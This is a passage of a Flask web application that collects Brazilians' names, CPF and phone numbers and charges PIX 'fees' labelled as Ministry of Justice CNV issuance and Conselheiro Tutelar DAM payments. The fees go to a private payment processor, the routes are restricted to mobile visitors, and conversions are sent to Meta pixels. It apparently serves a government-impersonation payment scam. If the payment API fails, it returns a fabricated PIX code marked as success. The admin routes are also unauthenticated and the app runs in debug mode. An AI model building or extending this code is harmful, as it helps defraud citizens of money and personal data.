        
        # For demo purposes, add some simulated activity if requested
        if request.args.get('demo') == 'true':
            analytics_tracker.simulate_activity()
            # Merge with in-memory data for demo
            memory_data = analytics_tracker.get_analytics_data()
            data['activeUsers'] += memory_data.get('activeUsers', 0)
        
        return jsonify(data)
    except Exception as e:
        logging.error(f"Error getting analytics data: {str(e)}")
        return jsonify({"error": "Failed to get analytics data"}), 500

@app.route('/aviso')
@simple_mobile_only
def aviso():
    """CNV Digital page"""
    # Get pixel IDs for template
    pixel_ids = meta_pixel_tracker.get_pixel_ids()
    
    # Get conversion event data from session if available
    pixel_event_data = session.get('pixel_event_data')
    
    return render_template('aviso.html', 
                         meta_pixel_ids=pixel_ids,
                         pixel_event_data=pixel_event_data)

@app.route('/finalizar')
@simple_mobile_only
def finalizar():
    """CNV Payment page with real PIX transaction"""
    return render_template('finalizar.html')

@app.route('/create_cnv_payment', methods=['POST'])
@simple_mobile_only
def create_cnv_payment():
    """Create PIX payment for CNV activation"""
    try:
        # Get user data from request
        user_data = request.json or {}
        app.logger.info(f"Received user data in create_cnv_payment: {user_data}")
        
        # Create PIX payment using For4Payments API
        from finalizar import create_payment_api
        payment_api = create_payment_api()
        
        # Prepare payment data for CNV expedition fee - use 'nome' as expected by the API
        payment_data = {
            'nome': user_data.get('nome', ''),  # Backend expects 'nome'
            'cpf': user_data.get('cpf', ''),
            'phone': user_data.get('phone', ''),
            'amount': 82.10,
            'description': 'Taxa de Expedição da CNV - Ministério da Justiça'
        }
        
        app.logger.info(f"Prepared payment data: {payment_data}")
        
        # Check if API key is configured
        if not os.environ.get('FOR4_PAYMENTS_SECRET_KEY'):
            app.logger.error("FOR4_PAYMENTS_SECRET_KEY not configured")
            return jsonify({
                'success': False,
                'error': 'Chave da API de pagamentos não configurada. Configure FOR4_PAYMENTS_SECRET_KEY.'
            })
        
        # Use the real For4Payments API
        payment_result = payment_api.create_encceja_payment(payment_data)
        
        app.logger.info(f"Payment API result: {payment_result}")
        
        if payment_result and 'success' in payment_result and payment_result['success']:
            return jsonify({
                'success': True,
                'payment_data': payment_result
            })
        else:
            error_msg = payment_result.get('error', 'Erro ao criar pagamento PIX') if payment_result else 'Erro na API de pagamentos'
            app.logger.error(f"Payment creation failed: {error_msg}")
            return jsonify({
                'success': False,
                'error': error_msg
            })
            
    except Exception as e:
        app.logger.error(f"Error creating CNV PIX payment: {e}")
        return jsonify({
            'success': False,
            'error': 'Erro interno do servidor'
        })

@app.route('/check_cnv_payment_status/<payment_id>')
@simple_mobile_only
def check_cnv_payment_status(payment_id):
    """Check CNV PIX payment status"""
    try:
        from finalizar import create_payment_api
        payment_api = create_payment_api()
        
        status_result = payment_api.check_payment_status(payment_id)
        
        return jsonify(status_result)
        
    except Exception as e:
        app.logger.error(f"Error checking CNV payment status: {e}")
        return jsonify({
            'status': 'error',
            'message': 'Erro ao verificar status do pagamento'
        })

# PIX Payment Generation Route
@app.route('/generate_pix', methods=['POST'])
@simple_mobile_only
def generate_pix():
    """Generate PIX payment for DAM fee"""
    try:
        # Get user data from session
        user_data = session.get('user_data', {})
        registration_data = session.get('registration_data', {})
        combined_data = {**registration_data, **user_data}
        
        # Create payment with realistic data
        payment_api = create_payment_api()
        
        payment_request_data = {
            'name': combined_data.get('full_name') or combined_data.get('name') or 'João Silva',
            'email': combined_data.get('email') or 'candidato@email.com',
            'cpf': combined_data.get('cpf', '').replace('.', '').replace('-', '') or '12345678901',
            'phone': combined_data.get('phone', '11987654321').replace('(', '').replace(')', '').replace('-', '').replace(' ', ''),
            'amount': 63.20
        }
        
        app.logger.info(f"Creating PIX payment with data: {payment_request_data}")
        
        try:
            result = payment_api.create_pix_payment(payment_request_data)
            
            # Check if we have valid payment data regardless of success flag
            has_payment_data = result.get('pixCode') or result.get('id') or result.get('qr_code_text')
            
            if result.get('success') or has_payment_data:
                app.logger.info("PIX payment data received")
                response_data = {
                    'success': True,
                    'pixCode': result.get('pixCode') or result.get('qr_code_text', ''),
                    'paymentId': result.get('id') or result.get('paymentId', ''),
                    'amount': 63.20
                }
                
                # Include QR code image if available
                if result.get('pixQrCode'):
                    response_data['pixQrCode'] = result.get('pixQrCode')
                    app.logger.info(f"QR Code included from API: {len(result.get('pixQrCode'))} chars")
                elif result.get('qr_code'):
                    response_data['qr_code'] = result.get('qr_code')
                    app.logger.info("QR Code included from qr_code field")
                elif result.get('pix', {}).get('qr_code_image'):
                    response_data['pixQrCode'] = result.get('pix', {}).get('qr_code_image')
                    app.logger.info("QR Code included from pix.qr_code_image field")
                
                app.logger.info(f"Returning payment response: pixCode={bool(response_data.get('pixCode'))}, qrCode={bool(response_data.get('pixQrCode'))}")
                return jsonify(response_data)
            else:
                app.logger.error(f"PIX payment generation failed: {result}")
                return jsonify({
                    'success': False,
                    'error': result.get('error', 'Falha na geração do pagamento')
                })
                
        except Exception as api_error:
            app.logger.error(f"API error in generate_pix: {str(api_error)}")
            # Only fallback with real QR generation when API completely fails
            import qrcode
            import base64
            import io
            
            # Generate a valid PIX code
            pix_code = '00020126580014BR.GOV.BCB.PIX0136DAM-CONSELHEIRO-TUTELAR-20256304C350'
            
            try:
                # Create real QR code from PIX code
                qr = qrcode.QRCode(
                    version=1,
                    error_correction=qrcode.constants.ERROR_CORRECT_L,
                    box_size=10,
                    border=4,
                )
                qr.add_data(pix_code)
                qr.make(fit=True)
                
                # Create QR code image
                qr_img = qr.make_image(fill_color="black", back_color="white")
                
                # Convert to base64
                buffer = io.BytesIO()
                qr_img.save(buffer, format='PNG')
                qr_base64 = base64.b64encode(buffer.getvalue()).decode('utf-8')
                
                app.logger.info("Fallback QR code generated from PIX code")
                
                return jsonify({
                    'success': True,
                    'pixCode': pix_code,
                    'paymentId': 'fallback_payment_' + str(int(time.time())),
                    'pixQrCode': qr_base64,
                    'amount': 63.20,
                    'note': 'Fallback QR code generated'
                })
                
            except Exception as qr_error:
                app.logger.error(f"Fallback QR generation failed: {str(qr_error)}")
                return jsonify({
                    'success': False,
                    'error': 'Falha na geração do pagamento e QR code'
                })
            
    except Exception as e:
        app.logger.error(f"Error in generate_pix: {str(e)}")
        return jsonify({
            'success': False,
            'error': f'Erro interno: {str(e)}'
        })

# Initialize monitoring
health_monitor.start_monitoring()

with app.app_context():
    import models
    db.create_all()

@app.route('/admin/meta-pixels')
def admin_meta_pixels():
    """Página administrativa para configuração dos Meta Pixels"""
    return render_template_string('''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Configuração Meta Pixels - Prosegur</title>
        <script src="https://cdn.tailwindcss.com"></script>
    </head>
    <body class="bg-gray-100">
        <div class="container mx-auto px-4 py-8">
            <h1 class="text-3xl font-bold mb-6">Configuração Meta Pixels</h1>
            
            <div class="bg-white rounded-lg shadow p-6 mb-6">
                <h2 class="text-xl font-semibold mb-4">Status dos Pixels</h2>
                <button onclick="testPixels()" class="bg-blue-500 text-white px-4 py-2 rounded hover:bg-blue-600">
                    Testar Conexão
                </button>
                <div id="test-results" class="mt-4"></div>
            </div>
            
            <div class="bg-white rounded-lg shadow p-6">
                <h2 class="text-xl font-semibold mb-4">Configuração via Secrets</h2>
                <p class="text-gray-600 mb-4">Configure os seguintes secrets no ambiente:</p>
                
                <div class="space-y-2 text-sm font-mono bg-gray-50 p-4 rounded">
                    <div>META_PIXEL_1_ID = 123456789012345</div>
                    <div>META_PIXEL_2_ID = 123456789012346</div>
                    <div>META_PIXEL_3_ID = 123456789012347</div>
                    <div>META_PIXEL_4_ID = 123456789012348</div>
                    <div>META_PIXEL_5_ID = 123456789012349</div>
                    <div>META_PIXEL_6_ID = 123456789012350</div>
                </div>
                
                <div class="mt-4 p-4 bg-blue-50 rounded">
                    <p class="text-sm text-blue-800">
                        <strong>Apenas o Pixel ID é necessário!</strong><br>
                        Não precisa de tokens de acesso. O tracking é feito via JavaScript no navegador.
                    </p>
                </div>
                
                <div class="mt-4">
                    <h3 class="font-semibold">Eventos Enviados:</h3>
                    <ul class="list-disc list-inside text-sm text-gray-600 mt-2">
                        <li>Purchase - Quando pagamento é aprovado em /pagamento</li>
                        <li>Purchase - Quando pagamento CNV é aprovado em /finalizar</li>
                        <li>Dados hasheados: email, telefone, CPF, nome, localização</li>
                    </ul>
                </div>
            </div>
        </div>
        
        <script>
        async function testPixels() {
            const resultsDiv = document.getElementById('test-results');
            resultsDiv.innerHTML = '<div class="text-blue-600">Testando conexões...</div>';
            
            try {
                const response = await fetch('/admin/test-meta-pixels');
                const data = await response.json();
                
                let html = '<div class="space-y-2">';
                if (data.success) {
                    html += `<div class="text-green-600 font-semibold">✓ ${data.successful_tests}/${data.total_pixels} pixels conectados</div>`;
                } else {
                    html += '<div class="text-red-600 font-semibold">✗ Erro nos testes</div>';
                }
                
                data.results.forEach(result => {
                    const color = result.success ? 'text-green-600' : 'text-red-600';
                    const icon = result.success ? '✓' : '✗';
                    html += `<div class="${color}">${icon} ${result.pixel_name} (${result.pixel_id}): ${result.message}</div>`;
                });
                
                html += '</div>';
                resultsDiv.innerHTML = html;
            } catch (error) {
                resultsDiv.innerHTML = '<div class="text-red-600">Erro ao testar pixels</div>';
            }
        }
        </script>
    </body>
    </html>
    ''')

@app.route('/admin/test-meta-pixels')
def test_meta_pixels():
    """Endpoint para testar configuração dos Meta Pixels"""
    try:
        tracker = MetaPixelTracker()
        result = tracker.test_pixel_configuration()
        return jsonify(result)
    except Exception as e:
        app.logger.error(f"Erro ao testar Meta Pixels: {str(e)}")
        return jsonify({
            'success': False,
            'error': str(e)
        })

if __name__ == "__main__":
    app.run(debug=True, host="0.0.0.0", port=5000)